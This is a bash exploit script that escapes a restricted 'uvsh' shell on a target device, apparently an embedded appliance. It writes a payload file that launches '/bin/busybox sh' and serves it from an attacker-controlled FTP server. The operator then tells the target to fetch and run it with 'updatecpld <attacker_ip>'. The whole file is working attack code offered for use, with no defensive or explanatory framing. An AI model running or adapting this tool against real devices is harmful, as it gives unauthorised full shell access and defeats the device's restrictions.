#!/bin/bash
# uvsh shell escape - serves payload via FTP for updatecpld command
# Usage: ./uvsh_escape.sh [attacker_ip]
# Then from uvsh: updatecpld <attacker_ip>

ATTACKER_IP="${1:-$(hostname -I 2>/dev/null | awk '{print $1}' || ipconfig getifaddr en0 2>/dev/null || echo '192.168.30.13')}"
FTP_DIR="/tmp/uvsh_escape_ftp"
FTP_PORT=21

echo "[*] Setting up FTP escape payload..."
mkdir -p "$FTP_DIR"

cat > "$FTP_DIR/cpldload" << 'EOF'
#!/bin/sh
/bin/busybox sh
EOF
chmod +x "$FTP_DIR/cpldload"

echo "[+] Payload ready at $FTP_DIR/cpldload"
echo "[+] Starting FTP server on $ATTACKER_IP:$FTP_PORT"
echo ""
echo "============================================"
echo "  From uvsh shell on target, run:"
echo "  updatecpld $ATTACKER_IP"
echo "============================================"
echo ""
echo "[*] Press Ctrl+C to stop"

cd "$FTP_DIR" && python3 -m pyftpdlib -p "$FTP_PORT" -w
